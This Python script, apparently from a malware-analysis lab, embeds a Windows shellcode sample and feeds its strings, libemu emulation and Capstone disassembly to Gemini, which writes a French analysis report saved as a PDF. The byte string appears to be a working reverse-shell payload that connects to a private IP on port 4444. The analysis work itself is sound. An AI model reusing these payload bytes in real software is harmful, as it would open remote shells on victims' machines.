from src.tp2.utils.strings import Strings
from src.tp2.utils.pylibemu import Pylibemu
from src.tp2.utils.capstone import Capstone
from google import genai
from dotenv import load_dotenv
import time
from markdown_pdf import MarkdownPdf, Section

def main():
    load_dotenv()
    shellcode = b"\xfc\x6a\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d"
    shellcode += b"\x3c\x8b\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34"
    shellcode += b"\x9a\x01\xee\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0"
    shellcode += b"\x75\xf6\x43\x66\x39\xca\x75\xe3\x4b\x8b\x4f\x24\x01\xe9"
    shellcode += b"\x66\x8b\x1c\x59\x8b\x4f\x1c\x01\xe9\x03\x2c\x99\x89\x6c"
    shellcode += b"\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c"
    shellcode += b"\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68\x33\x32"
    shellcode += b"\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53"
    shellcode += b"\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02"
    shellcode += b"\x57\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6"
    shellcode += b"\x97\x68\xc0\xa8\x35\x14\x66\x68\x11\x5c\x66\x53\x89\xe3"
    shellcode += b"\x6a\x10\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50"
    shellcode += b"\x53\x57\x53\x66\xb9\xc0\x38\xff\xe6"
    strings = Strings()
    pylibemu = Pylibemu()
    capstone = Capstone()
    data_strings = strings.get_shellcode_strings(shellcode)
    data_emu = pylibemu.get_libemu_analysis(shellcode)
    data_capstone = capstone.get_capstone_analysis(shellcode)

    contexte_malware = f"""
    --- SORTIE STRINGS ---
    {data_strings}

    --- ÉMULATION (LIBEMU) ---
    {data_emu}

    --- DÉSASSEMBLAGE (CAPSTONE) ---
    {data_capstone}
    """
    prompt = """"
        Rédige moi en français un rapport d'analyse malware sur un shellcode donné par la sortie. 
        Le rapport doit être décomposé en 3 parties : 
        - Partie managériale, où tu vulgarises ce que fait le shellcode et explique les dangers associés , 
        - Partie technique ou tu explique son fonctionnement et 
        - Partie détails d'opcode, où tu expliques un à un leurs rôle dans le code 
        Le tout dans un format professionnel et détaillé.
    """
    client = genai.Client()

    response = client.models.generate_content(
        model="gemini-2.5-flash", contents=[prompt, contexte_malware]
    )
    
    timestr = time.strftime("%d-%m-%Y_%H-%M")    
    nom_fichier = f"rapport_analyse_shellcode_{timestr}"

    pdf = MarkdownPdf()
    pdf.meta["title"] = 'Analyse Shellcode'
    pdf.add_section(Section(response.text, toc=False))
    pdf.save(f'{nom_fichier}.pdf')

    print(f"Rapport généré : {nom_fichier}")